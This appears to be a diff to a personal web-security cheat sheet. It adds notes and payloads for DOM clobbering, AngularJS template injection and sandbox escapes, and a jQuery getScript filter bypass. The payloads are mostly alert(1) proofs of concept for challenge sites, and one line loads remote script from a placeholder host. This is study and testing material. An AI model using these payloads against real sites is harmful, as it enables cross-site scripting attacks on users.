@@ -149,6 +149,8 @@ See `submit.html` for a sample form.
 
 === DOM Clobbering
 
+* http://www.thespanner.co.uk/2013/05/16/dom-clobbering/
+* http://holyvier.blogspot.ca/2015/05/northsec-xss-challenge-writeups.html
 * http://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream
 
 vulnerable
@@ -161,4 +163,56 @@ to exploit
 
     method=get%20name=body+id=PAYLOAD
     form method=
+
+==== Another example
+
+Final payload
+
+    https://xss.lol/domclob1/?formClass=red%20name=clientInfo%20id=%27%22/%3E%20%3Cimg%20src=xx%20onerror=alert(1)%20/%3E%27&test=%3Cscript%3E%20var%20simpleDate%20=%20{year:%272016%27,month:%2705%27,day:%2727%27};%20var%20clientInfo%20=%20{%22id%22:%22guest79424926%22,%22userName%22:%22Guest%22};%20%3C/script%3E
+
+This piece is to cancel javascript in the header by triggering a false case of
+XSS Auditor:
+
+    test=%3Cscript%3E%20var%20simpleDate%20=%20{year:%272016%27,month:%2705%27,day:%2727%27};%20var%20clientInfo%20=%20{%22id%22:%22guest79424926%22,%22userName%22:%22Guest%22};%20%3C/script%3E
+
+Clobbering happens on the formClass GET variable. We inject so that
+`clientInfo.id` is replaced by stuff we control.
+
+Vulnerable code:
+
+    document.getElementById("trackerDiv").innerHTML = "<img src=\"tracker.gif?client="+clientInfo.id+"&page=feedback\">";
+
+Payload
+
+    ?formClass=red%20name=clientInfo%20id=%27%22/%3E%20%3Cimg%20src=xx%20onerror=alert(1)%20/%3E%27
+
+
+=== Angular JS
+
+* Template injection: `{{ 1338 - 1 }}`
+* DOM XSS: $sce.trustAsHtml(userHtml) 
+* Look for these which don't escape: <div ng-bind-html-unsafe="userHtml">{{ template }}</div>
+* http://gosecure.github.io/security-cheat-sheet/
+
+== Sandbox escape payloads:
+
+* Version: 1.0.1 - 1.1.5
+
+    {{constructor.constructor('alert(1)')()}}
+
+* Version: 1.2.6 - 1.2.18
+
+    {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+
+* http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
+
+=== jQuery
+
+Use getScript API: http://api.jquery.com/jQuery.getScript/
+
+Ex:
+
+    onmouseover=%22$[`getS`%2B`cript`]`//example.com`
+
+Avoids (, ), script and '.
 
